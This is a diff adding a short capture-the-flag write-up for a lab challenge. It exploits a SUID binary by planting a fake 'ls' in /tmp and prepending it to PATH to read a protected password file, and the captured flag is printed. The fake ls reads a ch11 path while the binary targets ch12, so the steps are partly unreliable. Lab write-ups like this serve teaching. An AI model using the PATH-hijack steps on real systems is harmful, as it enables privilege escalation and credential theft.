@@ -1,0 +1,34 @@
+# Run a simple ls -ls
+app-script-ch12@challenge02:~$ ls -la
+total 24
+dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Aug 11  2015 .
+drwxr-xr-x 18 root                    root                    4096 Aug  7 22:08 ..
+-r--r-----  1 app-script-ch12-cracked app-script-ch12-cracked   14 Feb  8  2012 .passwd
+-r-sr-x---  1 app-script-ch12-cracked app-script-ch12         7160 Aug 11  2015 ch12
+-r--r-----  1 app-script-ch12         app-script-ch12          119 Aug 11  2015 ch12.c
+# We see that ch12 has SUID and this is our way in
+
+# We run strings to see what it calls but the source code was given so there was no need
+app-script-ch12@challenge02:~$ strings ch12
+ls /challenge/app-script/ch12/.passwd
+# We will see that it uses ls and this is our way in
+
+# We will create our own ls ;)
+# This creat our own ls in the /tmp but with in another folder
+app-script-ch12@challenge02:~$ mkdir /tmp/lsfake
+app-script-ch12@challenge02:~$ echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/lsfake/ls;
+
+# This will give it execute rights
+app-script-ch12@challenge02:~$  chmod +x /tmp/lsfake/ls;
+
+# We will add /tmp to the $PATH varible
+app-script-ch12@challenge02:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt/tools/checksec/
+app-script-ch12@challenge02:~$ export PATH=/tmp/lsfake:$PATH;
+app-script-ch12@challenge02:~$ echo $PATH
+/tmp/lsfake:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/opt/tools/checksec/
+
+# We run it and it gives us our password.
+app-script-ch12@challenge02:~$ ./ch12
+8a95eDS/*e_T#
+app-script-ch12@challenge02:~$
